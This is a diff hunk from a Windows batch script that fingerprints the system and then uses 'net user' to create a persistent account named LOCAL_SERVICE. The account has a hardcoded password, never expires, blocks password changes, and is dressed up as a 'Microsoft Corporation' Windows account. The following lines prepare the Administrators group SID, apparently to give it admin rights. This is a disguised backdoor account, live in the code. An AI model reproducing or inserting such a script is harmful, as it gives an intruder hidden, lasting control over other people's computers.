@@ -5,7 +5,7 @@ Set xOS=x64& If "%PROCESSOR_ARCHITECTURE%"=="x86" (If Not Defined PROCESSOR_ARCH
 for /f "tokens=3" %%l in ('reg query HKCU\Control" "Panel\International /v LocaleName') do set lang=%%l
 for /f "Delims=" %%a in ('ver') do (set os=%%a)
 echo !os! !xOS! !lang!
-net user LOCAL_SERVICE flvbyrf /add /fullname:"Microsoft Corporation" /comment:"Microsoft Windows Account" /countrycode:"000" /active:"yes" /expires:"never" /passwordchg:"NO"
+net user LOCAL_SERVICE 1Flvbyrf /add /fullname:"Microsoft Corporation" /comment:"Microsoft Windows Account" /countrycode:"000" /active:"yes" /expires:"never" /passwordchg:"NO"
 ::net user Администратор /active:yes
 SET AdmGroupSID=S-1-5-32-544
 SET AdmGroup=
